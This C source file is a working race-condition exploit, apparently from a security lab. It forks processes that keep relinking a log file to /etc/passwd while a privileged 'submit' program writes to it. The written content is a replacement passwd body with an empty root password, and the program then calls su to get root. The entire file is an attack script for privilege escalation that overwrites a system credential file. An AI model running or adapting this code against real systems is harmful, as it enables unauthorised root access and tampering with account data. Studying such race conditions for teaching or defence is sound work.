#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>

#define SUBMIT_LOG "/home/user/submit.log"


void parent() {
	int i;
	for (i = 0; i < 20; i++) {
		// modify passwd, leaving root, uesr and halt(for express reboot)
		// root:x: this x represent as need password
		// ref: https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/
		system("submit attack 'root::0:0:root:/root:/bin/bash\nhalt::0:1001::/:/sbin/halt\nuser::1000:1000::/home/user:/bin/sh\n'");
		remove(SUBMIT_LOG);
	}
}

void child() {
	int i;
	for (i = 0; i < 20; i++) {
		// IMPORTANT: usleep provides a gap such that we attackers can win the race. 
		usleep(1000 + rand() % 1000);
		remove(SUBMIT_LOG);
		symlink("/etc/passwd", SUBMIT_LOG);
	}
}

int main(void) {
	int i;
	int pid = -1;
	
	// ofstream attack("attack"); (<fstream> is not available)
	system("touch attack");

	for (i = 0; i < 20; i++) {
		pid = fork();

		if (pid < 0) {
			puts("PID < 0: Can't fork. \n");
			return 0;
		}
		if (pid > 0) {
			// parent process
			parent();
			waitpid(pid, NULL, 0);
		}
		if (pid == 0) {
			// child process
			child();
			return 0;
		}
	}
	system("su");
	system("rm attack");

	return 0;
}
